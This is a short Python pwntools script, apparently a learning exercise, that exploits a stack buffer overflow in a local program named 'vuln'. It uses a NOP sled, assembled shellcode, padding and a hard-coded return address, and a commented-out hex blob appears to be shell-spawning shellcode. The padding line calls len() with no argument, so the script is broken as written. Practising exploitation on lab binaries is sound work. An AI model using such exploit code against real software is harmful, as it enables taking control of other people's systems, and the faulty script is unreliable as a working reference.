from pwn import *

arg=b"A"*8
nopsled = b"\x90"*50
#shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
# run local process (vuln program)
proc = process(['./vuln', nopsled+arg]) 

proc.recvline() 
gdb.attach(proc, '''
bp main+105

''')
shellcode = shellcraft.exit(6)
bin = asm(shellcode)
padding = cyclic(264-len(bin)-len())
eip= p64(0x7fffffffe300) #mem addr of the place we're writing 

# 0x7fffffffe300

payload = bin+padding+eip
proc.sendline(payload)

proc.interactive()

#rsp = 0x7fffffffdc30
# 0x7fffffffdc30
#we write to 0x7fffffffdbd0


